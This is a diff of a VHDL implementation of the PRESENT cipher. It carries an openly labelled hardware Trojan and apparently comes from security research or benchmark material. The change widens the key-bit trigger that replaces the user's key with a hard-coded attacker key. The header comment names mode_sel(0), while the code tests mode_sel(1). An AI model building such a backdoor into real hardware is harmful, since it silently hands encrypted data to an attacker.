@@ -2,8 +2,8 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 5: trigger = specific pattern on the 4 Least Significant Bits of the input key and 
--- 80-bit version selected (i.e. mode_sel(0) = 0)
+-- Trojan 5: trigger = specific pattern on the 8 Least Significant Bits of the input key and 
+-- 80-bit version selected (i.e. mode_sel(0) = 0) -> triggering probability 2^{-9}
 -- payload = replace input key with attacker defined key -> all computed ciphertexts can only be
 -- decrypted by the attacker and all computed plaintexts are wrong compared to what the benign user expects.
 
@@ -42,8 +42,8 @@ architecture rtl of present_Trojan5 is
                 load_ena        : std_logic;
 
         signal  trojan_trig : std_logic;
-
-        constant TRIGGERING_PATTERN : std_logic_vector(3 downto 0) := b"1010";
+        
+        constant TRIGGERING_PATTERN : std_logic_vector(7 downto 0) := x"1A";
         constant PREDEFINED_KEY : std_logic_vector(127 downto 0) := x"0000_0000_0000_1234_DAAD_BCDE_FEFE_5454";
 
         signal  trojan_key : std_logic_vector(127 downto 0); 
@@ -51,7 +51,7 @@ begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
         
-        trojan_trig <= '1' when (key(3 downto 0) = TRIGGERING_PATTERN and mode_sel(1) = '0') else '0';
+        trojan_trig <= '1' when (key(7 downto 0) = TRIGGERING_PATTERN and mode_sel(1) = '0') else '0';
 
         trojan_key <= PREDEFINED_KEY when (trojan_trig = '1') else key;
 
